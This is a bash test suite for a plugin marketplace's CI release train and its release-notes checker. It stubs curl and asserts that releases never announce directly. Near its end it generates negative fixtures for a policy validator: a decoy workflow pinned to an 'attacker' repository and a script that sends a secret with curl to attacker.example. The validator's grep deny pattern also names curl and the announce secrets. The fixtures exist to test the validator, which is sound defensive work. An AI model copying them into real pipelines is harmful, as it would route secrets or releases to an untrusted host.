#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

HARDENED_SHA='08f7d22f3a5b59b1658ab2e96a20d0d3c352869c'
RETIRED_SHA='c981b872ebf650805200ad72c8b7142232f8b3f6'
ANNOUNCE_WORKFLOW='StartupBros-com/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml'
HARDENED_USES="$ANNOUNCE_WORKFLOW@$HARDENED_SHA"
ANNOUNCE_IF="github.event.release.draft == false && github.event.release.prerelease == false && needs.promote.result == 'success'"

pass() { printf 'ok - %s\n' "$1"; }
fail() { printf 'not ok - %s\n' "$1" >&2; exit 1; }
assert_eq() { [[ "$1" == "$2" ]] || fail "$3: expected $2, got $1"; pass "$3"; }

validate_release_policy() {
  local workflow="$1" script="$2" json
  if grep -Eq 'TOOL_RELEASE_ANNOUNCE_(SECRET|URL)|ANNOUNCE_(SECRET|URL)|x-tool-release-announce-secret|/api/internal/ops/tool-releases|(^|[[:space:]])curl([[:space:]]|$)' "$workflow" "$script"; then
    printf 'direct Tool Drop delivery surface is forbidden\n' >&2
    return 1
  fi
  if ! json="$(yq -o=json '.' "$workflow" 2>/dev/null)"; then
    printf 'release workflow must parse as YAML\n' >&2
    return 1
  fi
  jq -e '.on.release.types == ["published", "edited"]' <<<"$json" >/dev/null || {
    printf 'release events must be exactly published and edited\n' >&2
    return 1
  }
  jq -e '.permissions == {"contents": "read"}' <<<"$json" >/dev/null || {
    printf 'workflow permissions must be exactly contents read\n' >&2
    return 1
  }
  jq -e --arg key '${{ secrets.HOV_MARKETPLACE_DEPLOY_KEY }}' \
    'any(.jobs.promote.steps[]?; .with."ssh-key" == $key)' <<<"$json" >/dev/null || {
    printf 'promotion must retain the marketplace deploy key\n' >&2
    return 1
  }
  jq -e --arg uses "$HARDENED_USES" '.jobs.announce.uses == $uses' <<<"$json" >/dev/null || {
    printf 'announce job must use the hardened immutable workflow\n' >&2
    return 1
  }
  jq -e '.jobs.announce.needs == "promote"' <<<"$json" >/dev/null || {
    printf 'announce job must depend on promotion\n' >&2
    return 1
  }
  jq -e --arg condition "$ANNOUNCE_IF" '.jobs.announce.if == $condition' <<<"$json" >/dev/null || {
    printf 'announce job must retain the stable release gate\n' >&2
    return 1
  }
  jq -e '.jobs.announce.permissions == {"contents": "read", "id-token": "write"}' <<<"$json" >/dev/null || {
    printf 'announce permissions must be exactly contents read and id-token write\n' >&2
    return 1
  }
  jq -e '(.jobs.announce | keys | sort) == ["if", "name", "needs", "permissions", "uses"]' <<<"$json" >/dev/null || {
    printf 'announce job may not add inputs, secrets, or unrelated behavior\n' >&2
    return 1
  }
}

assert_policy_failure() {
  local label="$1" diagnostic="$2" workflow="$3" script="$4" output status
  if output="$(validate_release_policy "$workflow" "$script" 2>&1)"; then
    status=0
  else
    status=$?
  fi
  if [[ "$status" -eq 1 && "$output" == *"$diagnostic"* ]]; then
    pass "$label"
  else
    fail "$label: expected exit 1 with [$diagnostic], got exit $status and [$output]"
  fi
}

mkdir -p "$TMP/bin" "$TMP/source/.claude-plugin"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> "$CURL_LOG"\n' > "$TMP/bin/curl"
chmod +x "$TMP/bin/curl"
printf '{"name":"pro-gate","version":"0.1.0"}\n' > "$TMP/source/.claude-plugin/plugin.json"
printf '0.1.0\n' > "$TMP/source/VERSION"
git -C "$TMP/source" init -q
git -C "$TMP/source" config user.email test@example.com
git -C "$TMP/source" config user.name Test
git -C "$TMP/source" add .
git -C "$TMP/source" commit -qm source
git -C "$TMP/source" tag v0.1.0
SOURCE_SHA="$(git -C "$TMP/source" rev-parse HEAD)"
mkdir -p "$TMP/assets"
printf 'runtime\n' > "$TMP/assets/pro-gate-runtime-0.1.0.tar.gz"
(cd "$TMP/assets" && sha256sum pro-gate-runtime-0.1.0.tar.gz > pro-gate-runtime-0.1.0.tar.gz.sha256)

mkdir -p "$TMP/seed/.claude-plugin" "$TMP/seed/scripts"
printf '%s\n' '{"name":"hov","owner":{"name":"House of Vibe","url":"https://houseofvibe.ai"},"metadata":{"description":"test","version":"0.2.0"},"plugins":[{"name":"token-eater","description":"test","source":{"source":"url","url":"https://github.com/StartupBros-com/token-eater.git","sha":"0000000000000000000000000000000000000000"}},{"name":"pro-gate","description":"test","source":{"source":"url","url":"https://github.com/StartupBros-com/pro-gate.git","sha":"1111111111111111111111111111111111111111"}}]}' > "$TMP/seed/.claude-plugin/marketplace.json"
printf '#!/usr/bin/env bash\nexit 0\n' > "$TMP/seed/scripts/validate-marketplace.sh"
chmod +x "$TMP/seed/scripts/validate-marketplace.sh"
git -C "$TMP/seed" init -q
git -C "$TMP/seed" config user.email test@example.com
git -C "$TMP/seed" config user.name Test
git -C "$TMP/seed" add .
git -C "$TMP/seed" commit -qm seed
git -C "$TMP/seed" branch -M main
git clone -q --bare "$TMP/seed" "$TMP/marketplace.git"
git clone -q "$TMP/marketplace.git" "$TMP/marketplace"
git -C "$TMP/marketplace" config user.email test@example.com
git -C "$TMP/marketplace" config user.name Test

export PATH="$TMP/bin:$PATH" CURL_LOG="$TMP/curl.log"
: > "$CURL_LOG"
common=(
  EVENT_ACTION=published REPOSITORY=pro-gate RELEASE_ID=201 RELEASE_TAG=v0.1.0
  RELEASE_PRERELEASE=false RELEASE_DRAFT=false LATEST_STABLE_ID=201 SOURCE_ROOT="$TMP/source"
  ASSET_DIR="$TMP/assets" SOURCE_SHA="$SOURCE_SHA" MARKETPLACE_DIR="$TMP/marketplace"
)
env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
fresh="$TMP/fresh"
git clone -q "$TMP/marketplace.git" "$fresh"
assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$fresh/.claude-plugin/marketplace.json")" 201 'stable latest release promotes'
assert_eq "$(wc -l < "$CURL_LOG")" 0 'promotion never calls a direct announcement endpoint'

env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'rerun remains promotion-only'

git clone -q --bare "$TMP/marketplace.git" "$TMP/retry-marketplace.git"
git clone -q "$TMP/retry-marketplace.git" "$TMP/retry-marketplace"
git -C "$TMP/retry-marketplace" config user.email test@example.com
git -C "$TMP/retry-marketplace" config user.name Test
cat > "$TMP/retry-marketplace.git/hooks/pre-receive" <<EOF
#!/usr/bin/env bash
cat >/dev/null
if [ ! -e "$TMP/retry-push-rejected" ]; then
  : > "$TMP/retry-push-rejected"
  exit 1
fi
EOF
chmod +x "$TMP/retry-marketplace.git/hooks/pre-receive"
: > "$TMP/retry-curl.log"
CURL_LOG="$TMP/retry-curl.log" env "${common[@]}" RELEASE_ID=202 LATEST_STABLE_ID=202 \
  MARKETPLACE_DIR="$TMP/retry-marketplace" "$ROOT/scripts/release-train.sh" >/dev/null
retry_remote="$TMP/retry-remote-check"
git clone -q "$TMP/retry-marketplace.git" "$retry_remote"
assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$retry_remote/.claude-plugin/marketplace.json")" 202 'rejected push retries from remote tip'
assert_eq "$(wc -l < "$TMP/retry-curl.log")" 0 'promotion retry never delivers directly'

printf '#!/usr/bin/env bash\nexit 23\n' > "$TMP/fail-validator"
chmod +x "$TMP/fail-validator"
git clone -q "$TMP/marketplace.git" "$TMP/invalid-marketplace"
git -C "$TMP/invalid-marketplace" config user.email test@example.com
git -C "$TMP/invalid-marketplace" config user.name Test
if env "${common[@]}" RELEASE_ID=202 LATEST_STABLE_ID=202 \
  MARKETPLACE_DIR="$TMP/invalid-marketplace" MARKETPLACE_VALIDATOR="$TMP/fail-validator" \
  "$ROOT/scripts/release-train.sh" >/dev/null 2>&1; then
  fail 'malformed marketplace validation failure was swallowed'
else
  pass 'malformed marketplace validation failure propagates'
fi

remote_check="$TMP/remote-check"
git clone -q "$TMP/marketplace.git" "$remote_check"
assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$remote_check/.claude-plugin/marketplace.json")" 201 'failed validation prevents marketplace push'

env "${common[@]}" RELEASE_ID=200 LATEST_STABLE_ID=200 "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'older release no-op never delivers directly'

env "${common[@]}" RELEASE_ID=202 LATEST_STABLE_ID=202 RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'prerelease remains promotion and delivery no-op'

env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited matching release remains promotion-only'

corrupt="$TMP/corrupt"
git clone -q "$TMP/marketplace.git" "$corrupt"
git -C "$corrupt" config user.email test@example.com
git -C "$corrupt" config user.name Test
jq '(.plugins[] | select(.name == "pro-gate") | .source.sha) = "2222222222222222222222222222222222222222"' \
  "$corrupt/.claude-plugin/marketplace.json" > "$corrupt/marketplace.tmp"
mv "$corrupt/marketplace.tmp" "$corrupt/.claude-plugin/marketplace.json"
git -C "$corrupt" add .claude-plugin/marketplace.json
git -C "$corrupt" commit -qm 'corrupt immutable promotion tuple'
git -C "$corrupt" push -q origin HEAD:main
if env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null 2>&1; then
  fail 'edited release repairs immutable drift under the same release ID'
fi
assert_eq "$(wc -l < "$CURL_LOG")" 0 'same-ID drift fails closed without direct delivery'

env "${common[@]}" EVENT_ACTION=edited RELEASE_ID=202 LATEST_STABLE_ID=202 "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'newly stable edited release promotes without direct delivery'
assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$TMP/marketplace/.claude-plugin/marketplace.json")" 202 'newly stable edited release advances marketplace'

env "${common[@]}" EVENT_ACTION=edited RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited prerelease remains production no-op'

# Both customer feeds derive from the release body. The canonical marketplace announcer owns
# summary generation; this repository owns the earlier authoring gate that prevents developer
# shorthand from reaching that renderer.
CHK="$ROOT/scripts/check-release-notes.sh"
chk() { printf '%s' "$1" | bash "$CHK" - >/dev/null 2>&1; }

SHIPPED=$'## What\'s Changed\n* governor-rounds by @StartupBros in https://github.com/StartupBros-com/pro-gate/pull/66\n\n**Full Changelog**: https://x/y'
chk "$SHIPPED" && fail 'the shipped v0.31.0 body must be rejected' || pass 'the auto-generated body that shipped is rejected'

GOOD=$'## Highlights\n\n- Reviews that keep making progress now earn extra rounds automatically, instead of stopping at a flat limit.\n- Reviews going in circles stop early rather than burning your remaining quota.\n\n## Upgrade\n\nNothing to do.'
chk "$GOOD" && pass 'well-written customer notes pass' || fail 'good notes were rejected'

chk $'## Highlights\n\n## Upgrade\n\nNothing.' && fail 'empty Highlights must be rejected' || pass 'an empty Highlights section is rejected'
chk $'## Highlights\n\n- feat(pro-gate): trajectory-aware round governor with churn brake' && fail 'raw commit subject must be rejected' || pass 'a raw conventional-commit subject is rejected'
chk $'## Highlights\n\n- memo-crossbind' && fail 'branch name must be rejected' || pass 'a bare branch-name bullet is rejected'
chk $'## Highlights\n\n- Fixed the stuck-review problem reported in #67 by users last week.' && fail 'issue ref must be rejected' || pass 'an issue/PR reference in Highlights is rejected'
chk "$(printf '## Highlights\n\n- %s' "$(python3 -c "print('x' * 200)")")" && fail 'over-long bullet must be rejected' || pass 'a bullet past the 180-char feed limit is rejected'

# Feed parity for astral characters (#75 gate P2). The announcer truncates with
# utf16_prefix(line, 180), where an emoji costs 2 units; bash ${#text} counted it as 1, so a
# bullet could pass here and lose its tail in the published card. The pair is the proof: OVER
# and EDGE differ only in emoji count, so EDGE passing rules out rejection for any other reason.
ASTRAL_OVER="$(python3 -c "print('x' * 100 + '\U0001F600' * 45)")"   # 145 code points, 190 units
ASTRAL_EDGE="$(python3 -c "print('x' * 100 + '\U0001F600' * 40)")"   # 140 code points, 180 units
chk "$(printf '## Highlights\n\n- %s' "$ASTRAL_OVER")" && fail 'astral bullet past the UTF-16 feed limit must be rejected' || pass 'a bullet under 180 code points but past 180 UTF-16 units is rejected'
chk "$(printf '## Highlights\n\n- %s' "$ASTRAL_EDGE")" && pass 'a bullet at exactly 180 UTF-16 units still passes' || fail 'the 180-unit boundary bullet was wrongly rejected'
ASTRAL_OUT="$(printf '## Highlights\n\n- %s' "$ASTRAL_OVER" | bash "$CHK" - 2>&1 || true)"
case "$ASTRAL_OUT" in
  *'190 UTF-16 units'*) pass 'the astral rejection names the feed-counted width, not the code-point count' ;;
  *) fail "astral bullet was not rejected by the UTF-16 width rule: $ASTRAL_OUT" ;;
esac
chk $'## Highlights\n\n- Faster now.' && fail 'stub bullet must be rejected' || pass 'a too-short stub bullet is rejected'
chk $'## Highlights\n\n- feat!: memo-crossbind' && fail 'feat!: prefix must be rejected' || pass 'a scope-less breaking-change prefix is rejected after normalization'
chk $'## Highlights\n\n- fix(pro-gate)!: governor-rounds' && fail 'scoped feat!: must be rejected' || pass 'a scoped breaking-change prefix is rejected after normalization'
chk $'## Highlights\n\n- governor-rounds   ' && fail 'trailing-space branch name must be rejected' || pass 'a trailing-whitespace branch name is rejected'

grep -q 'notes-file' "$ROOT/scripts/publish-runtime-release.sh" \
  && pass 'publish-runtime-release prefers a hand-written notes file' \
  || fail 'publish-runtime-release still only auto-generates notes'
grep -q 'docs/release-notes/v\$version.md' "$ROOT/scripts/publish-runtime-release.sh" \
  && pass 'the notes file is resolved per version' \
  || fail 'no per-version notes file lookup'

WF="$ROOT/.github/workflows/release-train.yml"
ANCESTRY_LINE="$(grep -n 'merge-base --is-ancestor' "$WF" | cut -d: -f1)"
CHECKER_LINE="$(grep -n 'check-release-notes.sh' "$WF" | head -1 | cut -d: -f1)"
PROVISION_LINE="$(grep -n 'provision-ci-tools.sh' "$WF" | head -1 | cut -d: -f1)"
[ -n "$ANCESTRY_LINE" ] && [ -n "$CHECKER_LINE" ] && [ "$CHECKER_LINE" -gt "$ANCESTRY_LINE" ] \
  && pass 'the notes checker runs AFTER the protected-branch ancestry check' \
  || fail "tag-sourced checker runs before ancestry proof (checker=$CHECKER_LINE ancestry=$ANCESTRY_LINE)"
[ -n "$PROVISION_LINE" ] && [ "$PROVISION_LINE" -gt "$ANCESTRY_LINE" ] \
  && pass 'tool provisioning also runs after the ancestry check' \
  || fail 'provisioning runs before ancestry proof'

BIG="$(printf '## Highlights\n\n- %s\n\n## Details\n\n%s' \
  'Reviews now earn extra rounds when they are converging, instead of stopping at a flat limit.' \
  "$(for _ in $(seq 1 4000); do echo 'filler line for a long details section'; done)")"
chk "$BIG" && pass 'a long Details section does not break Highlights detection (no SIGPIPE)' \
  || fail 'large body still trips the SIGPIPE/pipefail path'
grep -q 'printf .%s. "\$notes" | grep -q' "$CHK" && fail 'a SIGPIPE-prone pipeline remains' \
  || pass 'no printf|grep -q pipelines remain in the checker'

chk $'## Highlights\n\n- revert: memo-crossbind changes' && fail 'revert: must be rejected' || pass 'revert: is rejected by generic subject detection'
chk $'## Highlights\n\n- deps: bump the oracle bridge to 0.17.0' && fail 'deps: must be rejected' || pass 'deps: is rejected by generic subject detection'
chk $'## Highlights\n\n- chore(release): cut v0.32.0' && fail 'arbitrary scoped type must be rejected' || pass 'an arbitrary scoped commit type is rejected'
chk $'## Highlights\n\n- Reviews stop early when they stop converging: no more burning quota on repeats.' \
  && pass 'prose containing a colon is NOT mistaken for a commit subject' || fail 'false positive on prose with a colon'

chk "$(printf '## Highlights\n\n- Reviews now earn extra rounds automatically,\n  which keeps a converging PR from being cut off.')" \
  && fail 'wrapped bullet must be rejected' || pass 'a wrapped Highlights bullet is rejected'

grep -q 'Require customer-ready notes for a version bump' "$ROOT/.github/workflows/ci.yml" \
  && pass 'PR CI requires notes for a version bump' || fail 'no PR-level version-bump notes gate'
grep -q 'docs/release-notes/v\$version.md' "$ROOT/.github/workflows/ci.yml" \
  && pass 'the version-bump gate resolves the per-version notes file' || fail 'version-bump gate does not resolve the notes file'

SCRIPT="$ROOT/scripts/release-train.sh"
validate_release_policy "$WF" "$SCRIPT"
pass 'checked-in release train uses the hardened OIDC policy'

mkdir -p "$TMP/policy"
if ! python3 - "$WF" "$SCRIPT" "$TMP/policy" "$HARDENED_USES" "$RETIRED_SHA" <<'PY'
import sys
from pathlib import Path

workflow_path, script_path, output_dir, hardened_uses, retired_sha = sys.argv[1:]
workflow = Path(workflow_path).read_text()
script = Path(script_path).read_text()
out = Path(output_dir)
uses_line = f"    uses: {hardened_uses}"
assert workflow.count(uses_line) == 1

retired = workflow.replace(uses_line, uses_line.replace(hardened_uses.rsplit("@", 1)[1], retired_sha), 1)
assert retired != workflow and retired_sha in retired
(out / "retired.yml").write_text(retired)

decoy = workflow.replace(
    uses_line,
    f"    uses: attacker/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml@{hardened_uses.rsplit('@', 1)[1]}\n"
    f"\n  decoy:\n    uses: {hardened_uses}",
    1,
)
assert decoy != workflow and decoy.count(hardened_uses) == 1 and "\n  decoy:\n" in decoy
(out / "decoy.yml").write_text(decoy)

shadowed = workflow.replace("      id-token: write", "      id-token: read", 1)
assert shadowed != workflow
(out / "shadowed.yml").write_text(shadowed)

direct_script = script + "\nANNOUNCE_URL=https://attacker.example\nANNOUNCE_SECRET=forbidden-test-fixture\ncurl \"$ANNOUNCE_URL\"\n"
assert direct_script != script and "ANNOUNCE_URL" in direct_script and "ANNOUNCE_SECRET" in direct_script and "curl \"$ANNOUNCE_URL\"" in direct_script
(out / "direct-script.sh").write_text(direct_script)
PY
then
  fail 'policy fixture generation failed'
fi
for fixture in retired.yml decoy.yml shadowed.yml direct-script.sh; do
  [[ -s "$TMP/policy/$fixture" ]] || fail "missing generated fixture: $fixture"
done

assert_policy_failure 'retired workflow pin is rejected' \
  'announce job must use the hardened immutable workflow' "$TMP/policy/retired.yml" "$SCRIPT"
assert_policy_failure 'blessed-SHA decoy cannot hide an attacker announce target' \
  'announce job must use the hardened immutable workflow' "$TMP/policy/decoy.yml" "$SCRIPT"
assert_policy_failure 'job-level permission shadowing is rejected' \
  'announce permissions must be exactly contents read and id-token write' "$TMP/policy/shadowed.yml" "$SCRIPT"
assert_policy_failure 'direct secret or URL delivery cannot return in the release script' \
  'direct Tool Drop delivery surface is forbidden' "$WF" "$TMP/policy/direct-script.sh"

echo 'ALL PASS'
